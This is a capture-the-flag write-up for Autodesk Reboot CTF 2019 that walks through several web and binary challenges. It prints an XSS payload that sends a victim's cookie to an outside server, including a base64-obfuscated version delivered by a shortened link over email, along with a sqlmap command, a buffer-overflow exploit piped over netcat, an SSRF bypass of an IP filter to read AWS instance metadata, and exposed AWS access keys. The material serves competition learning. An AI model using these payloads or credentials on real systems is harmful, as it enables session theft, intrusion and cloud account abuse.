## Autodesk Reboot CTF 2019


# Not So Equal

Freebie:

`always_use_protection_sanitize_your_strings`

# Unlimited Vacations

We can easily view the source code and decode it

```javascript
function send_request(e) {
    $.post("/api", e, function(e) {
        return e
    })
}

function get_token() {
    var e = document.cookie.match(new RegExp("(^| )token=([^;]+)"));
    return e ? e[2] : ""
}

function get_jwt_token(e, s) {
    send_request({
        action: "token",
        user: e,
        pass: s
    })
}

function show_message(e, s) {
    $("#alert_box").html('
            '+s+"

            ")}function hide_message(){$("#
            alert_box ").html()}function login(){$.post(" / api ",{action:"
            login ",user:$("#
            iul ").val(),pass:$("#
            ipl ").val()},function(e){var s=$.parseJSON(e);s.success?(document.cookie="
            token = "+s.token,document.location=". / app "):show_message("
            danger ","
            Error!Invalid username or password.
            ")})}function load_requests(){$.post(" / api ",{action:"
            load ",token:get_token()},function(e){var s=$.parseJSON(e);if(s.success)if(s.vacations.length<1)$("#
            vr ").html("

            You have no requests ");else{for(var o="
            ",t=!1,n=0;nverified':'under review';o+="

            Request# "+s.vacations[n][4]+" - "+s.vacations[n][0]+"("+s.vacations[n][1]+"
                to "+s.vacations[n][2]+") - "+a+"
            ",s.vacations[n][3]&&(t=s.vacations[n][5])}t&&$("#
            vrf ").html('

            '+t+"

            "),$("#
            vr ").html(o)}else logout()})}function submit_request(){$.post(" / api ",{action:"
            submit ",token:get_token(),s_date:$("#
            s_date ").val(),e_date:$("#
            e_date ").val(),desc:$("#
            desc ").val()},function(e){$.parseJSON(e).success?load_requests():logout()})}function verify_request(){$.post(" / api ",{action:"
            verify ",token:get_token(),id:$("#
            id ").val()},function(e){$.parseJSON(e).success?(show_message("
            success ","
            Vacation request has been successfully verified "),load_requests()):logout()})}function logout(){document.cookie="
            token = ",document.location=". / "}function register(){$.post(" / api ",{action:"
            register ",name:$("#
            inr ").val(),user:$("#
            iur ").val(),pass:$("#
            ipr ").val()},function(e){$.parseJSON(e).success?show_message("
            success ","
            Success!You may now login.
            "):show_message("
            danger ","
            Error!Username already exists.
            ")})}
```

Just need to call the `verify` action and here is the flag:

`brb_buying_a_one_way_ticket_to_hawaii_now`

# Satisfactory Qabalistic Laboratories 

Use sqlmap (i forgot to copy the command). You can work from here:

`python3.7 sqlmap.py -u "https://problems.metactf.com/content/sq-labs-nb/equipment.php?search=ab" --tables -D SQLite_masterdb`

Here is the flag: 

`jimmy_needs_some_help_lets_hire_little_bobby_tables`

# Cross Blog Scripting

**Recon:** By visiting the blog and post a few tests, i could see we can inject javascript into this the page. It will reflect on the title (ID). Another finding was that the URL actually carried the XSS injection code as well.

First, I need to craft a payload so that I could steal the cookie from admin. Note that I tried to redirect him to another site, but that did not work since the script to click on the link does not follow redirection. Ie, i need to reflect his cookie on the same page. Here is the script:

`<script>var img = new Image(0,0); img.src='http://VPSIP/ctf/cookie2.php?c=' + document.cookie; document.body.appendChild(img);</script>`

Since Josh was smart, he will trip out whatever inside script tag before clicking on it. I tried, so in order to avoid that we may need to encode it:

`https://problems.metactf.com/content/sleekblog/pages/view.php?id=<script>eval(atob(
dmFyIGltZyA9IG5ldyBJbWFnZSgwLDApOyBpbWcuc3JjPSdodHRwOi8vd3d3Lm5ndXllbnBodW9jLm5ldC9jdGYvY29va2llMi5waHA/Yz0nICsgZG9jdW1lbnQuY29va2llOyBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGltZyk7"))`

Now here is another problem. When Josh thinks the link is suspicious he won't click on it, so I just shorten int using tinyurl: (I tried goog.le and bit.ly but somehow they replace brackets with html chars, it does not work)

`https://tinyurl.com/y3cq32up`

Josh provided his email at the bottom of the pay, so i just send the link directly to him. A few moment later he click on the link and I could see his cookie:

`Cookies: SLEEK_BLOG_SID=541a8fe437325df4a9ae026ad2cfa376`

Replace my cookie with his cookie and I got: (actually need to set 2 more fields as well authorized_to_get_answer=true; Authorized=true; )

`c4nt_fa11_4_ph1shing_scam5_1f_u_d0nt_ch3ck_y0ur_3ma1l`

![](img/cbs1.png)

# Cloud Pillege

*I spent a lot of time on this, this was misleading :) i found flags from other challenges and found a decode/encode tool from of of the authors.*

**Recon:** by looking through his website i can see there are fonts, img, QuestionLink_files folder. So i thought I could use wfuzz to expand more. However, i did fuzz on the parent folder not the current html folder. Interestingly, i went down this road and found 4 different flags. If you want to explore that path below is my wfuzz code, and those folder are /access, /ssl, /cookie, /choice, /generato, /nonchalant

![](img/cp2.png)

`wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 404 https://problems.metactf.com/content/FUZZ`

Here are the not-official flags:

```
programmers_have_a_sense_of_taste_too
captain_of_the_nebuchadnezzar
yum_yum_yummy_yum_yum_yum
was_it_really_worth_the_points
```

I consulted Nick, This is not the right path. Then I remember the `.git` folder and it works:

`https://problems.metactf.com/content/questionlink/.git/`

Upon visiting this link, i can read a message that "Delete the aws keys" that Ian uploaded accidentially. In order to reverse the commit i use this tool:

`https://github.com/internetwache/GitTools`

First we need to dump the .git folder to a temp folder:
`./gitdumper.sh https://problems.metactf.com/content/questionlink/.git/ ./tmp`

Then use these commands to see the changes:
```
git status
git checkout .
git show
```
![](img/cp1.png)

Here is his key:
```
<script>
var creds = new AWS.Credentials({
  accessKeyId: 'AKIAJRVIF2GJPP3I25KA', secretAccessKey: '+KRvCzB+ufO731ZILkAUmqSaeLzHCuoNCZq76aCn'
});
</script>
```

So there are 2 flags in those AWS services:
```
enjoy-the-haiku-flag-part-1-of-3-is___committing_your_keys
flagpart2of3___exposing_all_your_data
flagpart3of3___weird_aal_says_eat_it
```

# Babybof

We are provided with `nc babybof.p.metactf.com 8000` and an executable

Upon nc-ing to the above server, it will ask for an input. Whenever i'm being asked to enter something I always try with a bunch of AAAAAAAAA... and right in this case I got `Segmentation Fault`. It's a very first step to check for [Buffer Overflow](https://www.owasp.org/index.php/Buffer_Overflow). The executable works exactly as the server so let's analyize the file. 

Here are my 3 basic steps whenever I run into Buffer Overflow Challenge:
> 1. Check how many characters that will cause the overflow 
> 2. Is it a shell code? or should we include our shell code?
> 3. Dump it and jump/attach the shell code. Remember: Little Indian Unsigned Int (mostly)

**Step 1:** Check how many characters that will cause the overflow 
In order to find how many chars will cause the overflow, there is a with trick with Python code, we can pipe with with the executable:
`python -c "print 'A'*35" | ./babybof`

Keep increasing and I can see it crashes at 40. Quick tip here, after a seg fault, I use this function to see what's being overwritten:
> dmesg | tail

![](png/baby1.png)

I can see A (ie: 41) is being filled up, keep increasing it and it's being overwritten more.

Note that for some other challenges it's not that easy. We may need to brute force the executable to find the point.

**Step 2:** Is it a shell code? or should we include our shell code?

Let's see what strings we can read:
> strings babybof

```
...win
vuln
main...
```

Good, things are not obfuscated. And there is actually a "win" so we don't need to include our shell script. To check the stack and memory I usually use this:
> readelf -s babybof | grep -i "FUNC"

To be honest, i thought `vuln` was the right function and i spent almost an hour on it.

(Usually when this does not work we may need to use `objdump -d apartment`)

![](img/baby2.png)

This is good, we not have the address for the `win` which is `00401172`. 

**Step 3:** Jump/attach the shell code. Remember: Little Indian Unsigned Int (mostly)

Now our goal is just to overwrite the return address with the shell code so that when the program ends, it will jump to the shell code. Another step here is that we (may) need to translate the address above to the little indian unsigned integer. This little python code can help with this:
> import struct
> struct.pack('<I', 0x00401172)

And we got our shell code address:
> 'r\x11@\x00'

Now let attach it to the python code in step 1 (see it's easy):
`python -c "print 'A'*40 + 'r\x11@\x00'"  | ./babybof`

![](img/baby3.png)

Good now we can see the flag, let's pipe it to the nc server:
`python -c "print 'A'*40 + 'r\x11@\x00'"  | nc 68.183.148.46 5000`


Here we got the flag:

`i_forgot_to_copy`

# More Than Meet the Eye

*I spent again 10+ hours on this one just Google and doing unrelated things ...*

**Recon:** We are provided with a text field which we can be used to display image and view its EXIF data. I notice that when it's not a link to an image, it will display the base64 content of the site. Too bad, we cannot upload any php, asp etc. extension.

Hours spent, just to find a way to inject shell code into image.

After reading a lot of articles on Google, somehow I notice the URL can be leveraged to read file, so i tried with `file:///etc/passswd` . Note that from this step on, we need to decode base64 from the image to get the content.

`https://eye.problems.metactf.com/?input_url=file:///etc/passwd&input_form=submit`

It actually works!!!

![](img/eye1.png)

With that, I can just read the index to see the content:

`https://eye.problems.metactf.com/?input_url=file:///var/html/www/index.php&input_form=submit`

```php
<?php
//var_dump(file_get_contents("https://metactf.com/assets/img/jake.jpg"));
$error = false;
if (isset($_GET["input_form"]) && isset($_GET["input_url"])) {
 //"https://raw.githubusercontent.com/ianare/exif-samples/master/jpg/Pentax_K10D.jpg");
 if (preg_match('/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/', $_GET["input_url"])) {
   $error = "Error! An IP address was found in the provided URL. IP addresses are forbidden for security reasons.";
 } else {
   $img = file_get_contents($_GET["input_url"]);
   if (!$img) {
     $error = "Error! The file could not be downloaded.";
   } else {
     $img_b64 = "data://image/jpeg;base64," . base64_encode($img);
     $exif = exif_read_data($img_b64);
     if (!$exif) {
       $error = "Error! No exif data was found.";
     }
   }
 }
}
//file_get_contents("https://raw.githubusercontent.com/ianare/exif-samples/master/jpg/Pentax_K10D.jpg")
//var_dump();
?>
```

Hours spent again. I'm stuck :)

Then Yathaarth reads the instruction again and it mentions EC2. What does it mean and what can we do with EC2? After going through a lot of articles i found this:

`https://medium.com/@pratiky054/ssrf-to-read-local-files-and-abusing-the-aws-metadata-8621a4bf382`

Look like we can read the `meta-data` and get more information from the Amazon service.

I first try with:
`https://eye.problems.metactf.com/?input_url=http://169.254.169.254/latest/user-data/hostname&input_form=submit`

Of course it's not working. By reading the index, IP address is not allowed in the URL :(

More hours spent and more hairs felt, i could not find anything. Fortunately, when i search for "how to bypass ip check in url" it comes up with this article:

`http://www.pc-help.org/obscure.htm`

Look like in the past, we can access websites through it octal, hex or even decimal value of the IP.

`http://www.csgnetwork.com/ipaddconv.html
https://superuser.com/questions/75930/open-websites-using-binary-ip-address`

I dig more and found 2 more articles, with that i could convert the meta-data IP into decimail (another bypass could be adding more 000 in front of each IP ranges, it should work as well).

`https://eye.problems.metactf.com/?input_url=http://2852039166/latest/meta-data/hostname&input_form=submit`

![](img/eye1.png)

Digging through `iam` we got:

```
{
  "Code" : "Success",
  "LastUpdated" : "2019-10-11T17:17:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6QB4TWDXWVP4SG25",
  "SecretAccessKey" : "UzTW719py30hL7K1DdBndeg/qfHHzHfuppw32OWZ",
  "Token" : "AgoJb3JpZ2luX2VjEPL//////////wEaCXVzLWVhc3QtMSJHMEUCIQCYNVMur6gUN3AUGX7jXdWD3P05Z7LBLPreQSM1qUtvXAIgGgm/ltnGOfanEluvGbFdCSl62H/r14AN0OC7si/olvoq4wMI2v//////////ARAAGgw5OTY1NTk1MzIyNzEiDGrEzs+HaNdDBsDMSiq3A14cidoKJX9+IaQPCrc9oxl4dLJaQTsA0IPiA61DcWghg8wGHYvHh81Unp6jOBR15Yfp/44jf3e2YlGeStGMws2UbV4DKDr4EiKhj6kQBsbo1gOWkfM+Sk05QBQtGxXZC20YlFQ3/U+pXFAXDvk5dxHxE4YXbUPvGBPZwcHaDA1wzFLM69aJ8aYSQfjUJLKwj2krlzV9gxkgG/vAbiHpvo3OvoV6HCZ/PggRFPdQ4JlP0XlbWmhwzinyWD+4CBtjwN5gbBiQ76gs0xQtXpLEk5cRdCcx0FvCGiH6Ysk6bDjsFF1qjaIZvHHen1B7QyZziDC4zA/mtvyyOzgO1n1NyJ/+3OkwgnybV/bfnegWuOiCGRYzYhNgzXn4Doypha6PHAFZcfjYaHlbZx/ZmjnUQNH4YN7qo1lVS1BycpqH7Mlg6sC26eOC0v+QeajgMqYGwIVA3X2XqcO0zXgs6A9Ysak1uy7JX48j/7cEZ9NoM38Wevm+1NmAug3SgAPdfDT8h7ykccP6wYPSmTuQsnHa3/yS1Q4zNmiVq6cTUO0Cq66qBPi8MD7Z6j4GpEHNT1fb0BrpktIGAo4wxPKC7QU6tAGhxWmy53ibXyX4cpH3uNj2UUheLAgJKEkMcoehsT8N00BCFDcP1adg/p7dKOq8wyQGvG31bYbM+JGACGimirg+09WE3eBPMb4NkZkObbu4OXlp063q2VIlhX00ZUN6Dp0GfjYWVyWAJ91T+A+vpxb6zkrCRceTNJBCUjsJg1TwBqJBmg2XsEKeag/MfVEb44x8Z2dFDwTT2jiyPnpB0w3wptcQ8lgYkoTT7u3pbije/49Yr58=",
  "Expiration" : "2019-10-11T23:28:29Z"
}
```

First we could not establish the connection to the service since the session was not set properly. Secondly, we did not know which services or bucket name to look through.

Hours spent again, I was desperated enough to ask the admins for help :) but no clues found. We even clicked on 2 "hints" but could not find the answer.

Again, i went back to this article and found an interesting piece: `user-data`

`https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html`

`https://eye.problems.metactf.com/?input_url=http://2852039166/latest/user-data/hostname&input_form=submit`

WTH, we got more info here :(

```
# To-do:
# Automatically load code from the
# s3 meta-problem-more-than-meets-the-eye bucket
# The IAM role should already be in place
```

With that, we went back to AWS and found our flag:

`with_great_iam_roles_comes_great_responsibility`

# Remote Data Pawnage

(Could not finish)

Found a Exchange file edb and inside it was a bonus flag, did not have time to look further.

# Hello, its me!

(Could not finish) 

Using searchspoit i could find the exploit for phpMailer:

![](img/hello1.png)

I compiled and tried to run it but looks like there is a problem with the SSL. So I did an nmap on the target:

`dig +nocmd hello.problems.metactf.com any +multiline +noall +answer`

=> IP: 54.86.12.243

`nmap -sV 54.86.12.243`

![](img/hello2.png)

Look like 8010 is a http proxy port that i could use. So I edited the exploit to use that proxy, but didn't work ... Didn't have time to go any further

# Perplexing Python

Didn't even try to reverse yet, been bruteforcing for 20+ hours with no result :)

# Onboarding

I was the one who spam the user creation as I set the wrong param in fuzz :)